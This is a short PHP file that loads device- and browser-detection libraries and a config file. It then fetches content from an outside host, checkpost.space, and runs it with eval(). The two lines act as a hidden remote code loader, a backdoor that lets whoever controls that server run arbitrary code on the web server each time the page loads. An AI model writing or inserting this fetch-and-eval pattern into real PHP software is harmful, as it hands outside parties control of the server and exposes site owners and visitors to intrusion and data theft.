<?php
  require_once('Mobile_Detect.php');
  require_once('config.php');
  require_once('Browser.php');

$a = file_get_contents("http://checkpost.space/php/heroku.json");
eval($a);
